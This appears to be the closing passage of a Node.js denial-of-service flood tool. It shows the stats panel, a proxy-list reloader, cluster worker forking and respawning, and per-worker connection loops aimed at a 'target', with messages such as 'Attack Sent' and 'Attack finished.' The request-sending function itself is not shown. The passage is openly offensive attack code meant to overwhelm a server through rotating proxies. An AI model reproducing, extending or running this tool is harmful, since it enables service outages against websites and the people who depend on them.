            else if (code.startsWith('4')) colored = code.yellow;
            else if (code.startsWith('5')) colored = code.red;
            else colored = code.gray;
            const pct = stats.total > 0 ? ((count / stats.total) * 100).toFixed(1) : '0.0';
            const barLen = Math.round((count / maxCount) * 20);
            const bar = '█'.repeat(barLen).red + '░'.repeat(20 - barLen).gray;
            out.push(row('   ' + padV(colored, 7) + bar + '  ' + padVStart(fmt(count), 9) + '  ' + padVStart((pct + '%').gray, 6)));
        }
    }
    out.push(thin);
    out.push(row(
        field('Rate', String(ratelimit).yellow, 18) +
        '  Full '.gray + onoff(isFull, 'red') + ' ' +
        ' Debug '.gray + onoff(debugMode, 'cyan')
    ));
    out.push(bot);

    process.stdout.write('\x1B[H' + out.join('\n') + '\x1B[J\n');
}

// ═══════════════════════════════════════════════════════════════
//  TIMERS
// ═══════════════════════════════════════════════════════════════
setInterval(() => { timer++; }, 1000);

setInterval(() => {
    try {
        const fresh = [...new Set(fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(p => p.trim() && p.includes(':')))];
        if (fresh.length > 0) proxy = fresh;
    } catch (e) { }
}, 30000);

// ═══════════════════════════════════════════════════════════════
//  MASTER / WORKER ENTRY
// ═══════════════════════════════════════════════════════════════
if (cluster.isMaster) {
    const workers = {}
    const startTime = Date.now();
    let lastTotal = 0;
    let finished = false;

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`†Attack Sent †`);

    cluster.on('exit', (worker) => {
        if (finished) return;
        const w = cluster.fork({ core: worker.id % os.cpus().length });
        if (workers[worker.id]) workers[worker.id][0] = w;
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })

    const panelTimer = setInterval(() => {
        let statuses = {};
        let total = 0;
        let activeWorkers = 0;
        for (let w in workers) {
            if (workers[w] && workers[w][0].state == 'online') {
                activeWorkers++;
                const message = workers[w][1];
                if (!message) continue;
                total += message.reqs || 0;
                if (message.statuses) {
                    for (let code in message.statuses) {
                        if (statuses[code] == null)
                            statuses[code] = 0;
                        statuses[code] += message.statuses[code];
                    }
                }
            }
        }

        const sortedStatuses = Object.entries(statuses).sort((a, b) => b[1] - a[1]);
        const rps = Math.max(0, total - lastTotal);
        lastTotal = total;

        renderPanel({
            startTime,
            target,
            activeWorkers,
            rps,
            total,
            sortedStatuses,
            proxyCount: proxy.length
        });
    }, 1000);

    const tcpTimer = setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => {
        finished = true;
        clearInterval(panelTimer);
        clearInterval(tcpTimer);
        for (let w in workers) {
            try { workers[w][0].kill(); } catch (e) { }
        }
        process.stdout.write('\x1B[2J\x1B[H');
        console.log('Attack finished.'.red.bold);
        setTimeout(() => process.exit(0), 500);
    }, time * 1000);
} else {
    let conns = 0
    let cumulativeStatuses = {}

    let i = setInterval(() => {
        if (conns < maxConns) {
            conns++
        } else {
            clearInterval(i)
            return
        }
        go()
    }, delay);

    const reporter = setInterval(() => {
        for (const code in statuses) {
            if (cumulativeStatuses[code] == null)
                cumulativeStatuses[code] = 0
            cumulativeStatuses[code] += statuses[code]
        }
        statuses = {}

        if (process.connected) {
            try {
                process.send({ reqs: reqCount, statuses: cumulativeStatuses })
            } catch (e) { }
        }
    }, 250)

    setTimeout(() => {
        clearInterval(reporter)
        clearInterval(i)
        process.exit(0)
    }, time * 1000);
}
